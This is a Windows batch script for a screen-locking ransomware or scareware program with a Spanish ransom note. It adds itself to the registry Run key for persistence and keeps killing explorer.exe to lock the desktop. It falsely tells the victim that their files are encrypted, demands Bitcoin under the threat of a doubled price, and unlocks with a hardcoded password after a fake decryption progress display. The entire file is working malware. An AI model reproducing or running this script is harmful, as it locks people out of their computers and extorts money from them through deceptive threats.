@echo off
title @A6 Decryptor@
color a
if not exist "Encrypt.sk" (REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Ransomware-A6 /t REG_SZ /d "%0") else (goto Bucle) >NUL 2>NUL
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%>>Encrypt.sk
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>Encrypt.sk
taskkill /im explorer.exe /f >NUL 2>NUL
:Bucle
taskkill /im explorer.exe /f >NUL 2>NUL
cls
echo ===================================================
echo      Upss... Sus Archivos han sido Encriptados
echo ===================================================      ! Si no Paga en el Tiempo Especificado
echo Que Ocurrio con mis Archivos?                              el Precio se Duplicara.
echo Sus Archivos han sido Encriptados si quiere
echo recuperarlos y volver a tener acceso a ellos
echo Tendra que pagar con Bitcoin a Dharkon SK                    ___________
echo y el una ves le page le dara un Codigo como                 /           \
echo Password Ingreselo y sus Archivos se                        ^|___________^|
echo Desencriptaran.                                             ^|           ^|   %time% - 1 hora
echo ===================================================         ^|           ^|
echo Si es un Usuario de Bajos Ingresos escriba a                ^|           ^|           $50
echo dharkonsk@gmail.com                                         ^|           ^|
echo ===================================================         ^|___________^|
echo Ejemplo de Password: XXX-XXX-XXX
echo ===================================================
set /p pass="Ingrese el Password: "
if %pass% == VDE-HRS-JKF (goto Decrypt) else (goto Incorrect)
:Incorrect
msg * El Password no es Valido
goto Bucle
:Decrypt
setlocal enabledelayedexpansion >NUL 2>NUL
set s=100
cls
if %s% GEQ 0 (
for /l %%c in (0,1,100) do (
echo.
echo. Desencriptando el Sector %%c%% Completado
timeout /t 1 >nul
cls
)
)
setlocal disabledelayedexpansion >NUL 2>NUL
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Ransomware-A6 /f >NUL 2>NUL
echo.
echo. Desencriptando el Sector 100%% Completado
echo.
echo. Puede Continuar...
start explorer.exe
del /f /q /s "Encrypt.sk" >NUL 2>NUL
pause >nul
exit